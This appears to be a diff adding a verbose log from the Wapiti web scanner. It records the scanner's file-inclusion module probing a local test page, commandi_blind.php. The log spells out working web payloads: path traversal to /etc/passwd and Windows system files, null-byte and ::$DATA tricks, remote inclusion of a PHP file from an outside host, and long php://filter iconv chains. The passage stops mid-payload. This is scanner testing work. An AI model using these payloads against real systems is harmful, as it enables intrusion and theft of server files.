+	data: form_bug=&bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:36:00.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:00.584 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:00.591 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.599 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.607 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:00.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:00.623 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:00.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:00.638 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.645 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.653 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.661 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.669 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:00.675 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:00.684 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.700 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:00.708 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:00.715 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:00.723 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:00.731 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.746 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.754 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.761 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:36:00.769 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:36:00.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:36:00.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.792 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:36:00.800 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:36:00.807 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.815 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.823 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=commandi_blind.php
+2024-03-20 16:36:00.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=commandi_blind.php%00
+2024-03-20 16:36:00.838 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=commandi_blind.php%3A%3A%24DATA
+2024-03-20 16:36:00.856 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit
+2024-03-20 16:36:00.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:36:00.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:36:00.887 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=%2Fetc%2Fpasswd
+2024-03-20 16:36:00.898 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=%2Fetc%2Fservices
+2024-03-20 16:36:00.923 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=%2Fetc%2Fservices%00
+2024-03-20 16:36:00.935 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:36:00.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:36:00.959 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:36:00.971 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.994 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:36:01.007 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:36:01.019 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:36:01.032 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:01.044 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:01.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.082 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:01.094 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:01.106 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:01.118 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:01.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.154 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-